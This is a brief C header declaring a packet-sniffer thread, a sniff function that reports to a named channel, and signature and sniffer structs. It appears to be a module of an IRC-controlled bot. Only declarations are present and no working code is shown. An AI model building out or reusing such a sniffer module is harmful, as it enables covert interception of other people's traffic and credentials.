

#ifndef NO_SNIFFER
DWORD WINAPI psniff(LPVOID param);
void sniff(int iMode, SOCKET bsock, char *szAction, char *szChannel, bool bSilent);

typedef struct signs
{
	char *szText;
	int iPacketType;
} signs;

typedef struct sniffer
{
	SOCKET bsock;
	char szAction[32];
	char szChannel[32];
} sniffer;
#endif